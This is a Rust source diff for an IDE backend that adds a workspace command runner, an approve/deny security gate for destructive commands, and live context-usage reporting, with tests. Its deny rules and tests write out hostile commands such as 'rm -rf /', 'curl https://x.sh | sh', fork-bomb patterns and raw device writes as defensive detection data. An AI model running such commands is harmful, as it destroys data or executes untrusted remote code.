@@ -41,6 +41,10 @@ pub struct BackendHost {
     ui_bus: Arc<UiEventBus>,
     /// Shared with the CommandRouter so control intents reach running runs.
     interrupts: Arc<InterruptHub>,
+    /// Genuinely destructive commands ([`dangerous_command`]) are not dropped — they are parked
+    /// here under a unique gate id and surfaced as a `SecurityGate` UiEvent. An `approve_gate`
+    /// intent with that id releases and runs the command; `deny_gate` drops it.
+    gate_book: Arc<GateBook>,
     /// The supervised `hawking serve` runtime, present only when a model is
     /// configured (`HIDE_MODEL_WEIGHTS` set). `None` keeps the host fully usable
     /// headless: the ~410 unit tests never spawn a server. When present, its
@@ -80,6 +84,7 @@ impl BackendHost {
             security: SecurityServices::default(),
             ui_bus: Arc::new(UiEventBus::default()),
             interrupts,
+            gate_book: Arc::new(GateBook::default()),
             runtime,
         })
     }
@@ -179,6 +184,23 @@ impl BackendHost {
             } => Some((session_id.clone(), text.clone())),
             _ => None,
         };
+        // Snapshot a RunCommand too: an accepted one actually executes in the workspace and streams
+        // its output back as tool_progress (the integrated terminal renders those rows).
+        let run_cmd = match &intent {
+            Intent::RunCommand { argv, cwd } => Some((argv.clone(), cwd.clone())),
+            _ => None,
+        };
+        // A held command's approve/deny round-trip: `approve_gate`/`deny_gate` carry the gate id the
+        // `SecurityGate` UiEvent was emitted with. `(approve, gate_id)`.
+        let gate_action: Option<(bool, String)> = match &intent {
+            Intent::Custom { name, payload } if name == "approve_gate" || name == "deny_gate" => {
+                payload
+                    .get("gate")
+                    .and_then(|v| v.as_str())
+                    .map(|g| (name == "approve_gate", g.to_string()))
+            }
+            _ => None,
+        };
 
         let ack = self.commands.handle(intent).await?;
 
@@ -187,7 +209,73 @@ impl BackendHost {
         if let (true, Some((session_id, prompt))) = (ack.accepted, submit) {
             self.spawn_submit_turn_generation(session_id, prompt);
         }
+        if let (true, Some((argv, cwd))) = (ack.accepted, run_cmd) {
+            self.spawn_command_run(argv, cwd);
+        }
+        // Release or drop a held gated command once its decision intent is recorded.
+        if let (true, Some((approve, gate))) = (ack.accepted, gate_action) {
+            if approve {
+                self.approve_gate(&gate);
+            } else {
+                self.deny_gate(&gate);
+            }
+        }
         Ok(ack)
+    }
+
+    /// Execute an accepted `RunCommand` in the workspace and stream its stdout and stderr back as
+    /// `tool_progress` UiEvents (the terminal mirrors those). The cwd is confined to the workspace
+    /// root. This is a real command runner, not a full interactive PTY (which needs a tty layer).
+    fn spawn_command_run(&self, argv: Vec<String>, cwd: Option<String>) {
+        if argv.is_empty() {
+            return;
+        }
+        // Security gate: a genuinely destructive command is NOT dropped. It is parked under a unique
+        // gate id and surfaced as a `SecurityGate` UiEvent; the user's `approve_gate` (with that id)
+        // releases and runs it, `deny_gate` drops it. Ordinary dev commands run immediately.
+        if let Some(reason) = dangerous_command(&argv) {
+            let gate = self.gate_book.hold(argv.clone(), cwd.clone());
+            self.ui_bus.publish(UiEvent {
+                seq: 0,
+                session_id: None,
+                kind: UiEventKind::SecurityGate {
+                    gate,
+                    message: format!("blocked: {} ({})", argv.join(" "), reason),
+                },
+            });
+            return;
+        }
+        self.spawn_exec(argv, cwd);
+    }
+
+    /// Spawn the command runner with the gate already cleared (a safe command, or a user-approved
+    /// one). Streams stdout/stderr back as `tool_progress`; confined to the workspace root.
+    fn spawn_exec(&self, argv: Vec<String>, cwd: Option<String>) {
+        let ui_bus = self.ui_bus.clone();
+        let root = self.services.config.workspace_root.clone();
+        tokio::spawn(async move {
+            exec_command_streamed(ui_bus, root, argv, cwd).await;
+        });
+    }
+
+    /// Approve a held gated command: release it from the book and run it (bypassing the gate, since
+    /// the user approved). A no-op if the gate id is unknown (already taken, denied, or evicted) —
+    /// so a duplicate/stale approval can never run anything.
+    fn approve_gate(&self, gate: &str) {
+        if let Some(cmd) = self.gate_book.take(gate) {
+            self.spawn_exec(cmd.argv, cmd.cwd);
+        }
+    }
+
+    /// Deny a held gated command: drop it without running.
+    fn deny_gate(&self, gate: &str) {
+        self.gate_book.remove(gate);
+    }
+
+    /// The count of commands currently parked awaiting an approve/deny decision (test/inspection).
+    #[cfg(test)]
+    fn pending_gate_count(&self) -> usize {
+        self.gate_book.len()
     }
 
     /// Spawn the generation for an accepted `SubmitTurn`: route it at the live
@@ -625,11 +713,12 @@ async fn generate_submit_turn(
         return Ok(String::new());
     }
 
-    let provider = HttpModelProvider::new(base_url);
+    let provider = HttpModelProvider::new(base_url.clone());
     let inference = Arc::new(ModelProviderInferenceClient::new(provider));
     let router = Arc::new(SimpleRouter::new(role_registry));
     let runtime = KernelRuntimeClient::new(router, inference);
 
+    let prompt_chars = prompt.len(); // for the post-turn context_manifest used-estimate (Spine A)
     let request = InferenceRequest {
         task_kind: "code".to_string(),
         prompt,
@@ -650,17 +739,55 @@ async fn generate_submit_turn(
         .await?;
     let stream_id = status_event.seq.to_string();
 
+    // W-F6-1: snapshot the live ceiling ONCE so the sync token sink can emit a
+    // throttled per-step occupancy patch with no per-token HTTP round-trip. The
+    // authoritative full `ManifestLive` patch still fires post-turn (below).
+    let live_snap = HttpModelProvider::new(base_url.clone())
+        .get_context_info()
+        .await
+        .map(|i| {
+            (
+                i.recurrent_state_bytes,
+                i.ctx_len_native,
+                i.ctx_len_effective.or(i.ctx_len_native).unwrap_or(0),
+            )
+        });
+
     let mut buf = String::new();
     {
         let bus = ui_bus.clone();
         let sess = session_id.clone();
         let sid = stream_id.clone();
         let seq = status_event.seq;
+        let mut tok_count = 0usize;
         let mut sink = |chunk: StreamChunk| {
             match chunk {
                 StreamChunk::Token { text, .. } => {
                     buf.push_str(&text);
                     bus.publish_token(seq, Some(sess.clone()), &sid, &text);
+                    // Throttled per-step occupancy (every 32 tokens), partial patch.
+                    tok_count += 1;
+                    if tok_count % 32 == 0 {
+                        if let Some((state_bytes, native, ceiling)) = live_snap {
+                            let used_est = (prompt_chars + buf.len()) / 4;
+                            let live = build_live_manifest(state_bytes, native, ceiling, used_est);
+                            if let Ok(mut lj) = serde_json::to_value(&live) {
+                                if let Some(o) = lj.as_object_mut() {
+                                    o.insert("used_tokens_estimate".to_string(), json!(used_est));
+                                    o.insert("estimated".to_string(), json!(true));
+                                    o.insert("partial".to_string(), json!(true));
+                                }
+                                bus.publish(UiEvent {
+                                    seq,
+                                    session_id: Some(sess.clone()),
+                                    kind: UiEventKind::ProjectionPatch {
+                                        projection: "context_manifest".to_string(),
+                                        patch: json!({ "live": lj }),
+                                    },
+                                });
+                            }
+                        }
+                    }
                 }
                 StreamChunk::Done { .. } => {
                     bus.flush(Some(sess.clone()));
@@ -680,7 +807,256 @@ async fn generate_submit_turn(
         };
         runtime.generate(request, &mut sink).await?;
     }
+
+    // Spine A: publish the live context_manifest the Context Stack reads. The
+    // effective ceiling is the engine's measured `.tq` multiplier x native (read
+    // live, never a constant). `used_tokens` here is a labeled per-turn estimate;
+    // precise per-token occupancy arrives once the engine reports sequence position.
+    {
+        let ctx_provider = HttpModelProvider::new(base_url);
+        if let Some(info) = ctx_provider.get_context_info().await {
+            let ceiling = info.ctx_len_effective.or(info.ctx_len_native).unwrap_or(0);
+            let used_est = (prompt_chars + buf.len()) / 4;
+            // Spine A (W-F2-1): build a real `ManifestLive`. For an SSM (RWKV-7,
+            // which reports a constant recurrent state) the regime is recall
+            // FIDELITY -- "how sharp", via the calibratable probe -- not KV
+            // saturation; the watermark bands then key off `1 - fidelity`.
+            let live = build_live_manifest(
+                info.recurrent_state_bytes,
+                info.ctx_len_native,
+                ceiling,
+                used_est,
+            );
+            let mut live_json = serde_json::to_value(&live).unwrap_or_else(|_| json!({}));
+            if let Some(obj) = live_json.as_object_mut() {
+                obj.insert("used_tokens_estimate".to_string(), json!(used_est));
+                obj.insert("estimated".to_string(), json!(true));
+            }
+            ui_bus.publish(UiEvent {
+                seq: status_event.seq,
+                session_id: Some(session_id.clone()),
+                kind: UiEventKind::ProjectionPatch {
+                    projection: "context_manifest".to_string(),
+                    patch: json!({
+                        "model_id": info.model_id,
+                        "arch": info.arch,
+                        "ctx_len_native": info.ctx_len_native,
+                        "ctx_len_effective": info.ctx_len_effective,
+                        "tq_multiplier": info.tq_multiplier,
+                        "tq_estimated": info.tq_estimated,
+                        "recurrent_state_bytes": info.recurrent_state_bytes,
+                        "active_slots": info.active_slots,
+                        "free_slots": info.free_slots,
+                        "live": live_json
+                    }),
+                },
+            });
+        }
+    }
     Ok(buf)
+}
+
+/// Spine A (W-F2-1): pick the live-context regime. An SSM (a model reporting a
+/// constant recurrent-state footprint) surfaces recall FIDELITY from the
+/// calibratable probe; a transformer surfaces KV occupancy. The probe is the
+/// swap point for a measured boot-needle curve later.
+fn build_live_manifest(
+    recurrent_state_bytes: Option<usize>,
+    ctx_len_native: Option<usize>,
+    ceiling: usize,
+    state_age_tokens: usize,
+) -> hawking_context::manifest::ManifestLive {
+    use hawking_context::fidelity::{LinearFidelity, RecallFidelityProbe};
+    use hawking_context::manifest::ManifestLive;
+    if let Some(state_bytes) = recurrent_state_bytes {
+        let probe = LinearFidelity::new(ctx_len_native.unwrap_or(0));
+        let fidelity = probe.fidelity(state_age_tokens);
+        ManifestLive::ssm(state_bytes, state_age_tokens, fidelity, ceiling)
+    } else {
+        ManifestLive::transformer(state_age_tokens, ceiling)
+    }
+}
+
+#[cfg(test)]
+mod live_manifest_tests {
+    use super::build_live_manifest;
+
+    #[test]
+    fn ssm_regime_carries_recall_fidelity() {
+        let ssm = build_live_manifest(Some(6 * 1024 * 1024), Some(1000), 1000, 500);
+        assert!(ssm.recall_fidelity.is_some());
+        assert!(ssm.state_bytes.is_some());
+        assert!(ssm.kv_seq_len.is_none());
+        // Half the horizon -> ~0.5 fidelity -> ~0.5 occupancy (1 - fidelity).
+        assert!((ssm.occupancy - 0.5).abs() < 0.05, "occupancy {}", ssm.occupancy);
+    }
+
+    #[test]
+    fn transformer_regime_has_no_fidelity() {
+        let tf = build_live_manifest(None, Some(4096), 4096, 1024);
+        assert!(tf.recall_fidelity.is_none());
+        assert!(tf.kv_seq_len.is_some());
+    }
+}
+
+/// A command held at the security gate, awaiting an approve/deny decision.
+#[derive(Clone, Debug, PartialEq, Eq)]
+struct PendingCommand {
+    argv: Vec<String>,
+    cwd: Option<String>,
+}
+
+/// A bounded book of commands parked at the security gate, keyed by gate id. Bounded so a never-
+/// answered gate cannot leak unboundedly: past `CAP`, the oldest entry is evicted (its gate becomes
+/// a no-op if later approved). Human-approved gates are rare, so a small `Vec` under a `Mutex` is
+/// ample. Gate ids are `command:<n>` (monotonic), unique so concurrent gates never collide.
+#[derive(Default)]
+struct GateBook {
+    inner: std::sync::Mutex<Vec<(String, PendingCommand)>>,
+}
+
+impl GateBook {
+    const CAP: usize = 32;
+
+    /// Park a command and return its fresh gate id.
+    fn hold(&self, argv: Vec<String>, cwd: Option<String>) -> String {
+        use std::sync::atomic::{AtomicU64, Ordering};
+        static GATE_SEQ: AtomicU64 = AtomicU64::new(1);
+        let gate = format!("command:{}", GATE_SEQ.fetch_add(1, Ordering::Relaxed));
+        let mut g = self.inner.lock().unwrap();
+        g.push((gate.clone(), PendingCommand { argv, cwd }));
+        if g.len() > Self::CAP {
+            g.remove(0);
+        }
+        gate
+    }
+
+    /// Remove and return the command parked under `gate` (approve path). `None` if unknown.
+    fn take(&self, gate: &str) -> Option<PendingCommand> {
+        let mut g = self.inner.lock().unwrap();
+        g.iter().position(|(k, _)| k == gate).map(|i| g.remove(i).1)
+    }
+
+    /// Drop the command parked under `gate` (deny path). Returns whether one was parked.
+    fn remove(&self, gate: &str) -> bool {
+        let mut g = self.inner.lock().unwrap();
+        match g.iter().position(|(k, _)| k == gate) {
+            Some(i) => {
+                g.remove(i);
+                true
+            }
+            None => false,
+        }
+    }
+
+    fn len(&self) -> usize {
+        self.inner.lock().unwrap().len()
+    }
+}
+
+/// Classify a command as genuinely destructive / system-level. Returns `Some(reason)` to block, `None`
+/// to allow. Conservative: ordinary dev commands (build, test, git, `rm -rf node_modules`) pass; only
+/// privilege escalation, filesystem destroyers, recursive deletes of a system/home path, remote code
+/// piped into a shell, and fork bombs are caught.
+fn dangerous_command(argv: &[String]) -> Option<&'static str> {
+    let prog = argv.first().map(|s| s.as_str()).unwrap_or("");
+    let j = argv.join(" ").to_lowercase();
+    if prog == "sudo" || prog == "doas" {
+        return Some("runs as administrator");
+    }
+    if prog == "mkfs" || j.contains("mkfs.") {
+        return Some("formats a filesystem");
+    }
+    if prog == "dd" && j.contains("of=/dev/") {
+        return Some("writes raw to a device");
+    }
+    if prog == "rm" && (j.contains("-rf") || j.contains("-fr") || (j.contains("-r") && j.contains("-f"))) {
+        if j.contains(" /") || j.contains(" ~") || j.contains(" /*") {
+            return Some("recursively deletes a system path");
+        }
+    }
+    if (j.contains("curl ") || j.contains("wget "))
+        && (j.contains("| sh") || j.contains("|sh") || j.contains("| bash") || j.contains("|bash"))
+    {
+        return Some("pipes a remote script into a shell");
+    }
+    if j.contains(":(){") || j.contains(":|:&") {
+        return Some("fork bomb");
+    }
+    if (prog == "chmod" || prog == "chown") && j.contains("-r") && (j.contains(" /") || j.contains(" ~")) {
+        return Some("recursively changes permissions on a system path");
+    }
+    None
+}
+
+// Run a command in the workspace and stream stdout/stderr back as tool_progress (the terminal renders
+// them). Confined to the workspace root. A real command runner, not a full interactive PTY. The
+// security gate is applied UPSTREAM (in `spawn_command_run`), so reaching here means the command is
+// either inherently safe or was user-approved via the gate round-trip.
+async fn exec_command_streamed(ui_bus: Arc<UiEventBus>, root: PathBuf, argv: Vec<String>, cwd: Option<String>) {
+    use std::sync::atomic::{AtomicU64, Ordering};
+    use tokio::io::AsyncBufReadExt;
+    static SHELL_SEQ: AtomicU64 = AtomicU64::new(1);
+    let call_id = format!("shell:{}", SHELL_SEQ.fetch_add(1, Ordering::Relaxed));
+    let line = |bus: &Arc<UiEventBus>, message: String| {
+        bus.publish(UiEvent {
+            seq: 0,
+            session_id: None,
+            kind: UiEventKind::ToolProgress { call_id: call_id.clone(), message },
+        });
+    };
+
+    // Confine the cwd to the workspace root (reject any escape).
+    let dir = match &cwd {
+        Some(c) if !c.contains("..") => root.join(c.trim_start_matches('/')),
+        _ => root.clone(),
+    };
+
+    let mut command = tokio::process::Command::new(&argv[0]);
+    command
+        .args(&argv[1..])
+        .current_dir(&dir)
+        .stdout(std::process::Stdio::piped())
+        .stderr(std::process::Stdio::piped());
+
+    let mut child = match command.spawn() {
+        Ok(c) => c,
+        Err(e) => {
+            line(&ui_bus, format!("{}: {}", argv[0], e));
+            return;
+        }
+    };
+
+    let mut readers = Vec::new();
+    if let Some(out) = child.stdout.take() {
+        let bus = ui_bus.clone();
+        let cid = call_id.clone();
+        readers.push(tokio::spawn(async move {
+            let mut lines = tokio::io::BufReader::new(out).lines();
+            while let Ok(Some(l)) = lines.next_line().await {
+                bus.publish(UiEvent { seq: 0, session_id: None, kind: UiEventKind::ToolProgress { call_id: cid.clone(), message: l } });
+            }
+        }));
+    }
+    if let Some(err) = child.stderr.take() {
+        let bus = ui_bus.clone();
+        let cid = call_id.clone();
+        readers.push(tokio::spawn(async move {
+            let mut lines = tokio::io::BufReader::new(err).lines();
+            while let Ok(Some(l)) = lines.next_line().await {
+                bus.publish(UiEvent { seq: 0, session_id: None, kind: UiEventKind::ToolProgress { call_id: cid.clone(), message: l } });
+            }
+        }));
+    }
+    let status = child.wait().await;
+    for r in readers {
+        let _ = r.await;
+    }
+    match status {
+        Ok(s) if s.success() => line(&ui_bus, "exit 0".to_string()),
+        Ok(s) => line(&ui_bus, format!("exit {}", s.code().unwrap_or(-1))),
+        Err(e) => line(&ui_bus, format!("wait failed: {e}")),
+    }
 }
 
 #[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
@@ -739,6 +1115,21 @@ fn count_check(name: &str, count: usize) -> HealthCheck {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn dangerous_command_gate() {
+        let argv = |s: &str| s.split_whitespace().map(String::from).collect::<Vec<_>>();
+        // allowed (ordinary dev)
+        assert!(dangerous_command(&argv("cargo test")).is_none());
+        assert!(dangerous_command(&argv("rm -rf node_modules")).is_none());
+        assert!(dangerous_command(&argv("git push origin main")).is_none());
+        // blocked (system-destructive / remote code / escalation)
+        assert!(dangerous_command(&argv("sudo rm file")).is_some());
+        assert!(dangerous_command(&argv("rm -rf /")).is_some());
+        assert!(dangerous_command(&argv("rm -rf ~")).is_some());
+        assert!(dangerous_command(&argv("dd if=x of=/dev/disk0")).is_some());
+        assert!(dangerous_command(&argv("curl https://x.sh | sh")).is_some());
+    }
     use hawking_research::{ResearchRun, ResearchState};
     use hide_core::api::UiEventKind;
     use hide_core::config::HideConfig;
@@ -1039,6 +1430,134 @@ mod tests {
             }
             other => panic!("expected a RuntimeStatus UiEvent, got {other:?}"),
         }
+        let _ = std::fs::remove_dir_all(dir);
+    }
+
+    // ---- security-gate hold / approve-and-run / deny ----
+
+    #[test]
+    fn gate_book_holds_releases_and_denies() {
+        let book = GateBook::default();
+        let cmd = |s: &str| s.split_whitespace().map(String::from).collect::<Vec<_>>();
+        let g1 = book.hold(cmd("sudo rm a"), None);
+        let g2 = book.hold(cmd("rm -rf /"), Some("sub".into()));
+        assert_ne!(g1, g2, "gate ids are unique");
+        assert_eq!(book.len(), 2);
+
+        // take() consumes exactly one and returns the parked command.
+        let taken = book.take(&g1).expect("g1 parked");
+        assert_eq!(taken.argv, cmd("sudo rm a"));
+        assert_eq!(book.len(), 1);
+        assert!(book.take(&g1).is_none(), "a gate id is single-use");
+
+        // remove() (deny) drops without returning.
+        assert!(book.remove(&g2));
+        assert!(!book.remove(&g2));
+        assert_eq!(book.len(), 0);
+
+        // an unknown gate is a no-op both ways (a stale approval can never run anything).
+        assert!(book.take("command:999").is_none());
+        assert!(!book.remove("command:999"));
+    }
+
+    #[test]
+    fn gate_book_evicts_oldest_past_cap() {
+        let book = GateBook::default();
+        let mut ids = Vec::new();
+        for i in 0..(GateBook::CAP + 4) {
+            ids.push(book.hold(vec!["sudo".into(), format!("c{i}")], None));
+        }
+        assert_eq!(book.len(), GateBook::CAP, "bounded at CAP");
+        for evicted in &ids[..4] {
+            assert!(book.take(evicted).is_none(), "the four oldest were evicted");
+        }
+        assert!(book.take(ids.last().unwrap()).is_some(), "the newest is still parked");
+    }
+
+    // A command classified dangerous (the `mkfs.` rule) but whose program does not exist, so even the
+    // approve path's execution fails fast with ENOENT instead of running anything real.
+    fn held_argv() -> Vec<String> {
+        vec!["mkfs.hidetest".to_string(), "noop".to_string()]
+    }
+
+    async fn first_security_gate(
+        rx: &mut tokio::sync::broadcast::Receiver<UiEvent>,
+    ) -> (String, String) {
+        loop {
+            let ev = tokio::time::timeout(std::time::Duration::from_secs(2), rx.recv())
+                .await
+                .expect("a UiEvent should arrive")
+                .expect("broadcast delivers");
+            if let UiEventKind::SecurityGate { gate, message } = ev.kind {
+                return (gate, message);
+            }
+        }
+    }
+
+    #[tokio::test]
+    async fn host_holds_dangerous_command_and_releases_on_approve() {
+        let dir = std::env::temp_dir().join(format!("hide_host_gate_{}", now_ms()));
+        let host = BackendHost::open_workspace(&dir).unwrap();
+        let mut rx = host.subscribe_ui();
+
+        // A destructive command is parked (not run) and surfaces a SecurityGate carrying its id.
+        let ack = host
+            .handle_intent(Intent::RunCommand { argv: held_argv(), cwd: None })
+            .await
+            .unwrap();
+        assert!(ack.accepted);
+        assert_eq!(host.pending_gate_count(), 1, "the command is held at the gate");
+
+        let (gate, message) = first_security_gate(&mut rx).await;
+        assert!(message.contains("mkfs.hidetest"), "the gate names the blocked command");
+
+        // Approving with that id releases the held command from the book (and dispatches it).
+        let ack = host
+            .handle_intent(Intent::Custom {
+                name: "approve_gate".to_string(),
+                payload: json!({ "gate": gate }),
+            })
+            .await
+            .unwrap();
+        assert!(ack.accepted);
+        assert_eq!(host.pending_gate_count(), 0, "approve consumes the held command");
+        let _ = std::fs::remove_dir_all(dir);
+    }
+
+    #[tokio::test]
+    async fn host_drops_held_command_on_deny() {
+        let dir = std::env::temp_dir().join(format!("hide_host_gate_deny_{}", now_ms()));
+        let host = BackendHost::open_workspace(&dir).unwrap();
+        let mut rx = host.subscribe_ui();
+        host.handle_intent(Intent::RunCommand { argv: held_argv(), cwd: None })
+            .await
+            .unwrap();
+        assert_eq!(host.pending_gate_count(), 1);
+        let (gate, _) = first_security_gate(&mut rx).await;
+
+        host.handle_intent(Intent::Custom {
+            name: "deny_gate".to_string(),
+            payload: json!({ "gate": gate }),
+        })
+        .await
+        .unwrap();
+        assert_eq!(host.pending_gate_count(), 0, "deny drops the held command without running it");
+        let _ = std::fs::remove_dir_all(dir);
+    }
+
+    #[tokio::test]
+    async fn host_approve_unknown_gate_is_noop() {
+        let dir = std::env::temp_dir().join(format!("hide_host_gate_unknown_{}", now_ms()));
+        let host = BackendHost::open_workspace(&dir).unwrap();
+        let ack = host
+            .handle_intent(Intent::Custom {
+                name: "approve_gate".to_string(),
+                payload: json!({ "gate": "command:does-not-exist" }),
+            })
+            .await
+            .unwrap();
+        assert!(ack.accepted, "the intent is still recorded as an event");
+        assert_eq!(host.pending_gate_count(), 0, "no held command to release; never panics");
         let _ = std::fs::remove_dir_all(dir);
     }
 }
